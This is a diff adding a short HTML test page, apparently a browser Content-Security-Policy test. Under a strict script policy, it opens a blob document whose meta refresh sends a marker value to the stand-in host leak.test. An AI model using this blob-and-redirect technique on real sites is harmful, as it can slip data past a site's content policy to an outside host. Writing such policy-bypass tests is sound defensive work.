@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Security-Policy" content="script-src 'self';">
+</head>
+<body>
+    <script>
+        var blob = new Blob([
+            '<html><head><meta http-equiv="refresh" content="0; url=https://leak.test/report/?leak=c1115298"></head><body></body></html>'
+        ], { type: 'text/html' });
+        var url = URL.createObjectURL(blob);
+        window.open(url);
+    </script>
+</body>
+</html>
